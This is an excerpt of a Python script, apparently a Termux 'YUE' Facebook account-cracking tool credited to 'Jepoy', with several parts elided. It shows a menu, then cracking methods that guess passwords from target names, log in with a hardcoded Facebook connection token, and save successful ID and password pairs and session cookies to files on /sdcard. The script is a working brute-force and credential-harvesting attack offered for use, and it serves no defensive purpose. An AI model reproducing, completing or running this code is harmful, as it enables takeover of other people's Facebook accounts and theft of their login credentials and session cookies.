#!/usr/bin/python
#Original written By Jepoy
#Yue(Jepoy Termux) Brand
...
logo =                                          """
    88b      88b   88b      88b   88b888b
      88b  88b     88b      88b   88
        88b        88b      88b   88b888b
        88b        88b      88b   88
        88b         b888b98o8b    88b8b8b
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print("××××××××××××××××××××××××××××××××××")
        input("Press enter to back YUE Menu ")
        exit()
...
def mogid():   
    ...
    print(f'[F] Add me on Facebook ')
    print('')
    select = input('Select Menu > ')
    if select =='1':
        method_crack()
    elif select =='W':
        os.system('xdg-open https://chat.whatsapp.com/D74PwKm6EJ7IoMjte7tgjg')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/jepoy.gabijab')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        MKT(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[YUE] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [YUE-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/YUE_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MKT_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [YUE-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/YUE_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[YUE] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [YUE-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/YUE_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/YUE_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [YUE-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[YUE] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [YUE-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/YUE_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
